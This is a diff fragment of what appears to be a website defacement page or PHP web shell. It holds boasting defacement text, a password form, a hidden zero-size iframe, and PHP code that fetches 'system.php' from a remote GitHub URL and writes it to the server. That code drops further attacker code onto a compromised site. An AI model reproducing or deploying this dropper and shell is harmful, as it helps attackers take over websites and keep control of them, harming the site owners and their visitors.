@@ -219,12 +219,12 @@ TypingText.prototype.run = function() {
 If you say this is a game,we also say this is a game,can make clutter on your website is our game,know me by name..!  </font> <br>
 </script>
 </center>
-<iframe width="0" height="0" src="https://www.anekaholiday.site/SoundCloud/ALx.mp3" frameborder="0" allowfullscreen</iframe>
 </html>
 <center>
 <form method="post">
 <input type="password" name="pass">
 </form>
+	<iframe width="0" height="0" src="https://www.anekaholiday.site/SoundCloud/ALx.mp3" frameborder="0" allowfullscreen</iframe>
 <?php 
 $fp = fopen("system.php", "w"); 
 fwrite($fp, file_get_contents("https://raw.githubusercontent.com/alxwahid/3voScript/master/system.php")); 
